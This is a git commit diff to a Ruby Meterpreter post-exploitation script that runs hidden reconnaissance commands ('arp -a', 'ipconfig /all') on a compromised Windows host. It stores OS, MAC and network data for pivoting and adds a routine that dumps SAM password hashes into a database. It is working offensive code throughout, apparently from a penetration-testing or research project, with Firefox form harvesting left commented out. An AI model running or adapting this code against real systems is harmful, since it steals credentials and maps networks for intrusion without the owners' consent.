40032781362a5075f75218f61ec4f641def7518f
khanke <khanke@tzi.de>
2011-01-19 17:13:20 +0100

    updated recon script

--- script/reconnaissance/reconnaissance.rb
+++ script/reconnaissance/reconnaissance.rb
@@ -12,6 +12,7 @@ def get_arp_a_infos
   hosts = Array.new
   cmd = 'arp -a'
   r, cmdout = '', ''  
+  count = false
   r = @client.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
   while d = r.channel.read
     cmdout << d
@@ -21,29 +22,49 @@ def get_arp_a_infos
     ip = line.scan /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/
     # extract MAC-adresses
     mac = line.scan /\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}/
+    
+    if count == false and not ip.empty?
+      hostdata = Hash.new
+      # write all information about the host in the database
+      sysinfo = client.sys.config.sysinfo
+  
+      hostdata[:workspace] = session.framework.db.workspace
+      hostdata[:host] 	   =  ip.first.to_s
+      hostdata[:os_name]   = (sysinfo['OS'].split'(')[0].strip
+      hostdata[:os_flavor] = ((sysinfo['OS'].split'(')[1].split',')[0].strip  
+      hostdata[:os_sp]     = (((sysinfo['OS'].split'(')[1].split',')[1].split')')[0].strip
+      hostdata[:name]      = sysinfo['Computer']
+      hostdata[:arch]      = sysinfo['Architecture']
+      hostdata[:os_lang]   = sysinfo['System Language']
+      
+      write_db hostdata
+      hostdata[:host] = ip.first.to_s
+      # Klappt noch nicht so ganz... da inkonsistenz durch doppelte IP-Adressen auftreten könnte
+      $pivot = session.framework.db.get_host(hostdata)
+      count = true
+    end
+    
     # write found ip- and mac adress in database           
     if not ip.empty? and not mac.empty?
       mac = mac.first.to_s.gsub('-',':')
-      aHost = Hash.new
-      aHost[:workspace] = session.framework.db.workspace
-      aHost[:host] =  ip.first.to_s
-      aHost[:mac] =  mac 
-      if $pivot[:host]  != ip.first.to_s
-        aHost[:pivot_host_id] = $pivot[:id] 
+      hostdata = Hash.new
+      hostdata[:workspace] = session.framework.db.workspace
+      hostdata[:host] =  ip.first.to_s
+      hostdata[:mac] =  mac 
+      if $pivot[:address]  != ip.first.to_s
+        hostdata[:pivot_host_id] = $pivot[:id] 
       end
-      hosts << aHost
+      write_db hostdata
     end
   end
   r.channel.close
   r.close
-  return hosts
 end
 
 # Function for running ipconfig -all on the owned host
 def get_host_infos
   hostdata = Hash.new
-  hostdata[:workspace] = session.framework.db.workspace
-  r, cmdout = '', '' 
+  r, cmdout = '', ''   
   r = @client.sys.process.execute('ipconfig /all', nil, {'Hidden' => true, 'Channelized' => true})
   while d = r.channel.read
     cmdout << d
@@ -51,35 +72,37 @@ def get_host_infos
     
   ips = Array.new
   macs = Array.new
-  
   cmdout.split("\n").each do |line|
-    # extract ip-adresses
-    ip = (line.scan /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/)
-    if ip[0] != nil
-      ips << ip
-    end
+    hostdata = Hash.new
     # extract MAC-adresses
     mac = (line.scan /\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}/)
     if mac[0] != nil
       mac[0] = mac[0].gsub('-',':')
       macs << mac
     end 
+    
+    if macs[0] != nil
+      # extract ip-adresses
+      ip = (line.scan /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/)	
+      if ip[0] != nil
+	ips << ip
+	# Check if IP-Adress is the one we attack
+	if $pivot[:address] == ips[0].to_s
+	   hostdata[:mac] = macs[0].first.to_s
+	   hostdata[:host] = ips[0].first.to_s
+	   
+	   write_db hostdata
+	   hostdata[:mac] = macs[0].first.to_s
+	   hostdata[:host] = ips[0].first.to_s
+	   $pivot = session.framework.db.get_host(hostdata)
+	end
+      end
+    end
+    if not macs.empty? and not ips.empty?
+      macs = Array.new
+      ips = Array.new
+    end
   end
-  # write all information about the host in the database
-  sysinfo = client.sys.config.sysinfo
-  
-  hostdata[:os_name]   = (sysinfo['OS'].split'(')[0].strip
-  hostdata[:os_flavor] = ((sysinfo['OS'].split'(')[1].split',')[0].strip  
-  hostdata[:host]      = ips[0][0]
-  hostdata[:host]
-  $pivot = session.framework.db.get_host(hostdata)
-  hostdata[:mac]       = macs[0][0]
-  hostdata[:os_sp]     = (((sysinfo['OS'].split'(')[1].split',')[1].split')')[0].strip
-  hostdata[:name]      = sysinfo['Computer']
-  hostdata[:arch]      = sysinfo['Architecture']
-  hostdata[:os_lang]   = sysinfo['System Language']
-   
-  return hostdata
 end
 
 def write_db host
@@ -118,10 +141,29 @@ def save_frfx_forms hostID, newRun = false, clear = false
   end
 end  
 
-write_db get_host_infos
+#Function for running the hashdump
 
-get_arp_a_infos.each do |host|
-  write_db host
+def get_hashdump_information
+  #print_status("Dumping password hashes...")
+	begin
+		@client.core.use("priv")
+		hashes = @client.priv.sam_hashes
+		hashes.each do |h|
+		  HashDump.new(:host_id=>$pivot[:id],:hash_key=>h.to_s()).save
+		end
+		#print_status("Hashes Dumped")
+	rescue ::Exception => e
+		print_status("\tError dumping hashes: #{e.class} #{e}")
+		print_status("\tPayload may be running with insuficient privileges!")
+	end
 end
 
-save_frfx_forms $pivot[:id]
+# Has to be the first Function cause $Pivot is set
+get_arp_a_infos
+
+get_host_infos
+
+get_hashdump_information
+
+
+#save_frfx_forms $pivot[:id]
